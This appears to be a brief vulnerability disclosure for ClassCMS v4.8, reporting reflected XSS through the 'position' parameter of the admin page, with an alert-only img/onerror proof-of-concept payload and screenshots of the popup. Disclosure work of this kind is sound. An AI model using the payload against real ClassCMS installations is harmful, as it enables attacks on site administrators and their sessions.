#### BUG_AUTHOR:acmglz
# Classcms Reflected xss exists in the background column management
## Download address:
https://github.com/ClassCMS/ClassCMS/releases/tag/v4.8
## Version:V4.8
## Tested on: PHP, Apache, MySQL
## Affected Page:
/index.php/admin

On this page, position parameter is vulnerable to reflected XSS Attack 
## Proof of vulnerability:
## Payload：
```
<img src=1 onerror=alert(/222/)>
```
## Trigger popup：
![image](https://github.com/user-attachments/assets/85bb6ac7-d3cc-4549-a0c8-c2324e2b4a66)


This page can be triggered after being modified

![image](https://github.com/user-attachments/assets/1ca59044-fec6-497d-bc3d-54563d4cf882)

![image](https://github.com/user-attachments/assets/31cdc6f8-0c03-421e-aada-951cd45d736e)

